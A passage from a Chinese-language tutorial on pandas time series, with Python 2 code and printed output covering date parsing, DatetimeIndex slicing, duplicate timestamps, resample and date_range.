<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> datestrs</span><br><span class="line"><span class="keyword">print</span> pd.to_datetime(datestrs)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#处理缺失值(None, 空字符串等)</span></span><br><span class="line">idx = pd.to_datetime(datestrs + [<span class="literal">None</span>])</span><br><span class="line"><span class="keyword">print</span> idx</span><br><span class="line"></span><br><span class="line"><span class="comment">#NaT(not a time)是pandas的时间戳数据的NA值</span></span><br><span class="line"><span class="keyword">print</span> idx[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> pd.isnull(idx)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[&apos;7/6/2011&apos;, &apos;8/6/2011&apos;]</span><br><span class="line">DatetimeIndex([&apos;2011-07-06&apos;, &apos;2011-08-06&apos;], dtype=&apos;datetime64[ns]&apos;, freq=None)</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DatetimeIndex([&apos;2011-07-06&apos;, &apos;2011-08-06&apos;, &apos;NaT&apos;], dtype=&apos;datetime64[ns]&apos;, freq=None)</span><br><span class="line">NaT</span><br><span class="line">[False False  True]</span><br></pre></td></tr></table></figure>
</li>
<li><p>datetime格式定义(兼容ISO C89)</p>
<p>|  代码    |     说明                             |<br>|———|————————————————————-|<br>| %Y   | 4位数的年                               |<br>| %y   | 2位数的年                               |<br>| %m   | 2位数的月[01,12]                      |<br>| %d   | 2位数的日[01,31]                      |<br>| %H   | 时(24小时制)[00,23]                   |<br>| %    | 时(12小时制)[01,12]                   |<br>| %M   | 2位数的分[00,59]                      |<br>| %S   | 秒[00,61]秒60 61用于闰秒              |<br>| %w   | 用整数表示的星期几[0(星期天),6]       |<br>| %U   | 每年的第几周[00,53]                   |<br>|      | 星期天被认为每周的第一天                |<br>|      | 每年第一个星期天之前得几天认为是”第0周” |<br>| %W   | 每年的第几周[00,53]                   |<br>|      | 星期一被认为每周的第一天                |<br>|      | 每年第一个星期一之前得几天认为是        |<br>| %z   | 以+HHMM或-HHMM表示UTC时区偏移量         |<br>|      | 如果时区为naive,返回空字符串            |<br>| %F   | %Y-%m-%d简写形式，列如2012-04-18        |<br>| %D   | %m/%d/%y简写形式，列如04/18/12          |</p>
</li>
<li><p>特定于当前环境的日期格式</p>
<p>|  代码    |      说明                                       |<br>|———|——————————————————————-|<br>| %a   | 星期几的简写                                |<br>| %A   | 星期几的全称                                |<br>| %b   | 月份的简写                                  |<br>| %B   | 月份的全称                                  |<br>| %c   | 完整的日期和时间                            |<br>|      | 列如”Tue 01 May 2012 04:20:57 PM”           |<br>| %p   | 不同环境中的AM或PM                          |<br>| %x   | 适合于不同当前环境的日期格式                |<br>|      | 列如在美国，”May 1, 2012”会产生”05/01/2012” |<br>| %X   | 适合于当前环境的时间格式                    |<br>|      | 例如”04:24:12 PM”                           |</p>
</li>
</ol>
<h2 id="时间序列基础"><a href="#时间序列基础" class="headerlink" title="时间序列基础"></a>时间序列基础</h2><h3 id="前提知识"><a href="#前提知识" class="headerlink" title="前提知识"></a>前提知识</h3><ol>
<li><p>pandas最基本的时间序列类型就是以时间戳为索引的Series</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">dates = [datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">2</span>), datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">5</span>), datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">7</span>),</span><br><span class="line">         datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">8</span>), datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">10</span>), datetime(<span class="number">2011</span>, <span class="number">1</span>, <span class="number">12</span>)]</span><br><span class="line">ts = pd.Series(np.random.randn(<span class="number">6</span>), index = dates)</span><br><span class="line"><span class="keyword">print</span> ts</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2011-01-02   -0.845472</span><br><span class="line">2011-01-05    0.326411</span><br><span class="line">2011-01-07   -0.002475</span><br><span class="line">2011-01-08   -0.225972</span><br><span class="line">2011-01-10    0.030098</span><br><span class="line">2011-01-12    1.321111</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>datetime对象实际上被放在一个DatetimeIndex中</p>
<ol>
<li><p>上面的ts就变成一个TimeSeries</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> type(ts)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ts.index</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;class &apos;pandas.core.series.Series&apos;&gt;</span><br><span class="line">DatetimeIndex([&apos;2011-01-02&apos;, &apos;2011-01-05&apos;, &apos;2011-01-07&apos;, &apos;2011-01-08&apos;,</span><br><span class="line">               &apos;2011-01-10&apos;, &apos;2011-01-12&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=None)</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
<li><p>不同索引的时间序列之间的算术运算会自动按日期对齐</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> ts + ts[::<span class="number">2</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">2011-01-02   -1.690945</span><br><span class="line">2011-01-05         NaN</span><br><span class="line">2011-01-07   -0.004949</span><br><span class="line">2011-01-08         NaN</span><br><span class="line">2011-01-10    0.060196</span><br><span class="line">2011-01-12         NaN</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>pandas用numpy的datetime64数据类型以纳秒形式储存时间戳</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> ts.index.dtype</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">datetime64[ns]</span><br></pre></td></tr></table></figure>
</li>
<li><p>DatetimeIndex的各q个标量值是pandas的Timestamp对象</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stamp = ts.index[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> stamp</span><br><span class="line"><span class="keyword">print</span> type(stamp)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2011-01-02 00:00:00</span><br><span class="line">&lt;class &apos;pandas.tslib.Timestamp&apos;&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>TimeStamp可以随时自动转换为datetime对象</p>
<ol>
<li>此外还可以储存频率信息(如果有的话),且知道如何执行时区转换及其他操作</li>
</ol>
</li>
</ol>
<h3 id="索引、选取、子集构造"><a href="#索引、选取、子集构造" class="headerlink" title="索引、选取、子集构造"></a>索引、选取、子集构造</h3><ol>
<li><p>因为TimeSeries是Series的一个子集，所以在索引和数据选取方面行为是一样的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">stamp = ts.index[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">print</span> stamp</span><br><span class="line"><span class="keyword">print</span> ts[stamp]</span><br><span class="line"></span><br><span class="line"><span class="comment">#另一种更为方便的用法，传入一个可以被解释为日期的字符串</span></span><br><span class="line"><span class="keyword">print</span> ts[<span class="string">'1/10/2011'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> ts[<span class="string">'20110110'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对于较长的时间序列，只需传入"年" 或 "年月" 即可获得数据的切片</span></span><br><span class="line">longer_ts = pd.Series(np.random.randn(<span class="number">1000</span>),</span><br><span class="line">                      index = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">1000</span>))</span><br><span class="line"><span class="keyword">print</span> longer_ts[<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> len(longer_ts[<span class="string">'2001'</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> longer_ts[<span class="string">'2001-05'</span>]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#通过日期进行切片的方式只对规则Series有效</span></span><br><span class="line"><span class="keyword">print</span> ts[datetime(<span class="number">2011</span>,<span class="number">1</span>,<span class="number">9</span>):]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#对于大部分时间序列是按照时间先后排序的，</span></span><br><span class="line"><span class="comment">#因此可以用不存在于该时间序列中的时间戳来对其切片(范围查询)</span></span><br><span class="line"><span class="keyword">print</span> ts[<span class="string">'1/6/2011'</span>: <span class="string">'1/11/2011'</span>] <span class="comment">#可以传入字符串日期，datetime或Timestamp</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#另一个截取的方法</span></span><br><span class="line"><span class="keyword">print</span> ts.truncate(after = <span class="string">'1/9/2011'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#对DF进行索引</span></span><br><span class="line">dates = pd.date_range(<span class="string">'1/1/2000'</span>, periods = <span class="number">100</span>, freq = <span class="string">'W-WED'</span>) <span class="comment">#星期三的日期</span></span><br><span class="line">long_df = pd.DataFrame(np.random.randn(<span class="number">100</span>,<span class="number">4</span>),</span><br><span class="line">                       index = dates,</span><br><span class="line">                       columns = [<span class="string">'Colorado'</span>, <span class="string">'Texas'</span>, <span class="string">'New York'</span>, <span class="string">'Ohio'</span>])</span><br><span class="line"><span class="keyword">print</span> long_df.ix[<span class="string">'5-2001'</span>]</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">2011-01-07 00:00:00</span><br><span class="line">-0.00247469657877</span><br><span class="line">0.0300981333535</span><br><span class="line"></span><br><span class="line">0.0300981333535</span><br><span class="line"></span><br><span class="line">2002-09-22   -1.292983</span><br><span class="line">2002-09-23   -0.663150</span><br><span class="line">2002-09-24   -1.246379</span><br><span class="line">2002-09-25   -0.480229</span><br><span class="line">2002-09-26   -1.425084</span><br><span class="line">Freq: D, dtype: float64</span><br><span class="line"></span><br><span class="line">365</span><br><span class="line"></span><br><span class="line">2001-05-01    0.522341</span><br><span class="line">2001-05-02    1.105745</span><br><span class="line">2001-05-03   -0.955111</span><br><span class="line">2001-05-04   -0.129135</span><br><span class="line">2001-05-05   -0.480308</span><br><span class="line">2001-05-06   -0.611974</span><br><span class="line">2001-05-07   -0.489040</span><br><span class="line">2001-05-08    1.599516</span><br><span class="line">2001-05-09   -1.718454</span><br><span class="line">2001-05-10    0.896244</span><br><span class="line">2001-05-11    0.398462</span><br><span class="line">2001-05-12    0.114994</span><br><span class="line">2001-05-13    2.601561</span><br><span class="line">2001-05-14   -0.022382</span><br><span class="line">2001-05-15    0.161495</span><br><span class="line">2001-05-16   -0.749117</span><br><span class="line">2001-05-17    0.251396</span><br><span class="line">2001-05-18    0.096229</span><br><span class="line">2001-05-19    0.116899</span><br><span class="line">2001-05-20    0.598400</span><br><span class="line">2001-05-21   -1.143373</span><br><span class="line">2001-05-22    0.740993</span><br><span class="line">2001-05-23   -0.163081</span><br><span class="line">2001-05-24    1.468237</span><br><span class="line">2001-05-25    1.161466</span><br><span class="line">2001-05-26   -0.262837</span><br><span class="line">2001-05-27    0.308709</span><br><span class="line">2001-05-28   -0.332932</span><br><span class="line">2001-05-29    0.536197</span><br><span class="line">2001-05-30   -0.072682</span><br><span class="line">2001-05-31    1.216165</span><br><span class="line">Freq: D, dtype: float64</span><br><span class="line"></span><br><span class="line">2011-01-10    0.030098</span><br><span class="line">2011-01-12    1.321111</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">2011-01-07   -0.002475</span><br><span class="line">2011-01-08   -0.225972</span><br><span class="line">2011-01-10    0.030098</span><br><span class="line">dtype: float64</span><br><span class="line">2011-01-02   -0.845472</span><br><span class="line">2011-01-05    0.326411</span><br><span class="line">2011-01-07   -0.002475</span><br><span class="line">2011-01-08   -0.225972</span><br><span class="line">dtype: float64</span><br><span class="line">            Colorado     Texas  New York      Ohio</span><br><span class="line">2001-05-02 -0.068790  0.991744 -1.583433 -1.133356</span><br><span class="line">2001-05-09 -0.027371  0.003850 -1.567402 -0.744111</span><br><span class="line">2001-05-16  0.920044 -0.274756 -0.112520 -0.577484</span><br><span class="line">2001-05-23 -1.403174 -1.606607  0.509411  0.160882</span><br><span class="line">2001-05-30  1.904117  1.430996 -0.646121  0.874684</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="带有重复索引的时间序列"><a href="#带有重复索引的时间序列" class="headerlink" title="带有重复索引的时间序列"></a>带有重复索引的时间序列</h3><ol>
<li><p>例子</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dates = pd.DatetimeIndex([<span class="string">'1/1/2000'</span>, <span class="string">'1/2/2000'</span>, <span class="string">'1/2/2000'</span>, <span class="string">'1/2/2000'</span>,<span class="string">'1/3/2000'</span>])</span><br><span class="line">dup_ts = pd.Series(np.arange(<span class="number">5</span>), index = dates)</span><br><span class="line"><span class="keyword">print</span> dup_ts</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">2000-01-01    0</span><br><span class="line">2000-01-02    1</span><br><span class="line">2000-01-02    2</span><br><span class="line">2000-01-02    3</span><br><span class="line">2000-01-03    4</span><br><span class="line">dtype: int32</span><br></pre></td></tr></table></figure>
<ol>
<li><p>检查索引的is~unique属性~，来知道它是不是唯一</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> dup_ts.index.is_unique</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">False</span><br></pre></td></tr></table></figure>
</li>
<li><p>进行索引，要么标量值，要么切片</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> <span class="string">'不重复的返回值：'</span></span><br><span class="line"><span class="keyword">print</span> dup_ts[<span class="string">'1/3/2000'</span>] <span class="comment">#不重复</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'重复的返回值：'</span></span><br><span class="line"><span class="keyword">print</span> dup_ts[<span class="string">'1/2/2000'</span>] <span class="comment">#重复</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">不重复的返回值：</span><br><span class="line">4</span><br><span class="line">重复的返回值：</span><br><span class="line">2000-01-02    1</span><br><span class="line">2000-01-02    2</span><br><span class="line">2000-01-02    3</span><br><span class="line">dtype: int32</span><br></pre></td></tr></table></figure>
</li>
<li><p>对非唯一的时间戳进行聚合，一个办法是使用groupby，并传入level =<br>0(索引是唯一一层!)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">grouped = dup_ts.groupby(level = <span class="number">0</span>)</span><br><span class="line"><span class="keyword">print</span> grouped.mean()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> grouped.count()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2000-01-01    0</span><br><span class="line">2000-01-02    2</span><br><span class="line">2000-01-03    4</span><br><span class="line">dtype: int32</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2000-01-01    1</span><br><span class="line">2000-01-02    3</span><br><span class="line">2000-01-03    1</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h2 id="日期的范围、频率以及移动"><a href="#日期的范围、频率以及移动" class="headerlink" title="日期的范围、频率以及移动"></a>日期的范围、频率以及移动</h2><h3 id="pandas中的时间序列是不规则的，但是需要频率进行分析时用resample"><a href="#pandas中的时间序列是不规则的，但是需要频率进行分析时用resample" class="headerlink" title="pandas中的时间序列是不规则的，但是需要频率进行分析时用resample"></a>pandas中的时间序列是不规则的，但是需要频率进行分析时用resample</h3><ol>
<li><p>resample会用缺失值填充没有的地方</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> ts</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> ts.resample(<span class="string">'D'</span>).index</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">2011-01-02   -0.845472</span><br><span class="line">2011-01-05    0.326411</span><br><span class="line">2011-01-07   -0.002475</span><br><span class="line">2011-01-08   -0.225972</span><br><span class="line">2011-01-10    0.030098</span><br><span class="line">2011-01-12    1.321111</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">DatetimeIndex([&apos;2011-01-02&apos;, &apos;2011-01-03&apos;, &apos;2011-01-04&apos;, &apos;2011-01-05&apos;,</span><br><span class="line">               &apos;2011-01-06&apos;, &apos;2011-01-07&apos;, &apos;2011-01-08&apos;, &apos;2011-01-09&apos;,</span><br><span class="line">               &apos;2011-01-10&apos;, &apos;2011-01-11&apos;, &apos;2011-01-12&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="生成日期范围，使用date-range"><a href="#生成日期范围，使用date-range" class="headerlink" title="生成日期范围，使用date~range~"></a>生成日期范围，使用date~range~</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">index = pd.date_range(<span class="string">'4/1/2012'</span>,<span class="string">'6/1/2012'</span>)</span><br><span class="line"><span class="keyword">print</span> index[<span class="number">-5</span>:]</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#默认date_range会按天数计算时间点，如果只传入起始或结束时间，那就还得传入一个表示一段时间的数字</span></span><br><span class="line"><span class="keyword">print</span> pd.date_range(start = <span class="string">'4/1/2012'</span>, periods = <span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> pd.date_range(end = <span class="string">'6/1/2012'</span>, periods = <span class="number">20</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#如果希望一个由每月最后一个工作日组成的索引，可传入"BM"频率(business end of month)</span></span><br><span class="line"><span class="keyword">print</span> pd.date_range(<span class="string">'1/1/2000'</span>, <span class="string">'12/1/2000'</span>, freq = <span class="string">"BM"</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#date_range默认会保留起始和结束时间戳的时间信息(如果有的话)</span></span><br><span class="line"><span class="keyword">print</span> pd.date_range(<span class="string">'5/2/2000 12:56:31'</span>, periods = <span class="number">5</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#有时虽然起始和结束日期带有时间信息，但希望产生一组被规范化(normalize)到午夜的时间戳</span></span><br><span class="line"><span class="comment"># normalize选项可以实现这功能</span></span><br><span class="line"><span class="keyword">print</span> pd.date_range(<span class="string">'5/2/2012 12:56:31'</span>, periods = <span class="number">5</span>, normalize = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">DatetimeIndex([&apos;2012-05-28&apos;, &apos;2012-05-29&apos;, &apos;2012-05-30&apos;, &apos;2012-05-31&apos;,</span><br><span class="line">               &apos;2012-06-01&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</span><br><span class="line"></span><br><span class="line">DatetimeIndex([&apos;2012-04-01&apos;, &apos;2012-04-02&apos;, &apos;2012-04-03&apos;, &apos;2012-04-04&apos;,</span><br><span class="line">               &apos;2012-04-05&apos;, &apos;2012-04-06&apos;, &apos;2012-04-07&apos;, &apos;2012-04-08&apos;,</span><br><span class="line">               &apos;2012-04-09&apos;, &apos;2012-04-10&apos;, &apos;2012-04-11&apos;, &apos;2012-04-12&apos;,</span><br><span class="line">               &apos;2012-04-13&apos;, &apos;2012-04-14&apos;, &apos;2012-04-15&apos;, &apos;2012-04-16&apos;,</span><br><span class="line">               &apos;2012-04-17&apos;, &apos;2012-04-18&apos;, &apos;2012-04-19&apos;, &apos;2012-04-20&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</span><br><span class="line"></span><br><span class="line">DatetimeIndex([&apos;2012-05-13&apos;, &apos;2012-05-14&apos;, &apos;2012-05-15&apos;, &apos;2012-05-16&apos;,</span><br><span class="line">               &apos;2012-05-17&apos;, &apos;2012-05-18&apos;, &apos;2012-05-19&apos;, &apos;2012-05-20&apos;,</span><br><span class="line">               &apos;2012-05-21&apos;, &apos;2012-05-22&apos;, &apos;2012-05-23&apos;, &apos;2012-05-24&apos;,</span><br><span class="line">               &apos;2012-05-25&apos;, &apos;2012-05-26&apos;, &apos;2012-05-27&apos;, &apos;2012-05-28&apos;,</span><br><span class="line">               &apos;2012-05-29&apos;, &apos;2012-05-30&apos;, &apos;2012-05-31&apos;, &apos;2012-06-01&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</span><br><span class="line"></span><br><span class="line">DatetimeIndex([&apos;2000-01-31&apos;, &apos;2000-02-29&apos;, &apos;2000-03-31&apos;, &apos;2000-04-28&apos;,</span><br><span class="line">               &apos;2000-05-31&apos;, &apos;2000-06-30&apos;, &apos;2000-07-31&apos;, &apos;2000-08-31&apos;,</span><br><span class="line">               &apos;2000-09-29&apos;, &apos;2000-10-31&apos;, &apos;2000-11-30&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;BM&apos;)</span><br><span class="line"></span><br><span class="line">DatetimeIndex([&apos;2000-05-02 12:56:31&apos;, &apos;2000-05-03 12:56:31&apos;,</span><br><span class="line">               &apos;2000-05-04 12:56:31&apos;, &apos;2000-05-05 12:56:31&apos;,</span><br><span class="line">               &apos;2000-05-06 12:56:31&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</span><br><span class="line"></span><br><span class="line">DatetimeIndex([&apos;2012-05-02&apos;, &apos;2012-05-03&apos;, &apos;2012-05-04&apos;, &apos;2012-05-05&apos;,</span><br><span class="line">               &apos;2012-05-06&apos;],</span><br><span class="line">              dtype=&apos;datetime64[ns]&apos;, freq=&apos;D&apos;)</span><br></pre></td></tr></table></figure>
<h3 id="频率和日期偏移量"><a href="#频率和日期偏移量" class="headerlink" title="频率和日期偏移量"></a>频率和日期偏移量</h3><ol>
<li><p>基础频率(base<br>frequency)都由一个字符串表示，比如”M”代表每月，”H”代表每小时</p>
</li>
<li><p>对于每一个基础频率，都有一个日期偏移量(date offset)的对象与之对应</p>
<ol>
<li><p>列如 小时计算的平率可以用Hour类表示</p>
